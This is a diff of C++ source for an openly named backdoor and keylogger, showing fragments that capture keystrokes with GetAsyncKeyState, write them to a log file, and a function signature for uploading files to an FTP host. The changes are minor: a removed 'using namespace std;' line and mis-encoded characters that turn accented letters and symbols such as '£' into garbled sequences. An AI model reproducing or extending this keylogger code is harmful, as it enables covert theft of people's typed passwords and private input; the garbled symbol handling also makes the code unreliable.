@@ -1,8 +1,6 @@
 // TCHAR t[100]; = char t[100];
 // WCHAR t[100]; = wchar_t t[100];
 
-
-using namespace std;
 #include "backdoorlib.h"
 #include <iostream>
 #include <stdio.h>
@@ -365,7 +363,7 @@ int download_on_ftp(char* filename, char* ftp_host, int ftp_port, char* ftp_user
 
 
 void WriteLog(string filename, const char* key) {
-    ofstream write(filename, ios::app); //ios:app precise de ne pas re ecrire le fichier a chaque entrée
+    ofstream write(filename, ios::app); //ios:app precise de ne pas re ecrire le fichier a chaque entrÃ©e
     if (write.is_open()) {
         write << key;
         write.close();
@@ -395,7 +393,7 @@ int keylistener(string FILENAME_LOG,int key) {
         WriteLog(FILENAME_LOG, "\n");
         return 0;
 
-    case '¾':
+    case 'Â¾':
         //cout << ".";
         WriteLog(FILENAME_LOG, ".");
         return 0;
@@ -534,8 +532,8 @@ int keylogger_spawn(string FILENAME_LOG)
                     {
                         if (GetAsyncKeyState(0x10))
                         {
-                            //cout << "£";
-                            WriteLog(FILENAME_LOG, "£");
+                            //cout << "Â£";
+                            WriteLog(FILENAME_LOG, "Â£");
                         }
                         else {
                             //cout << "3";
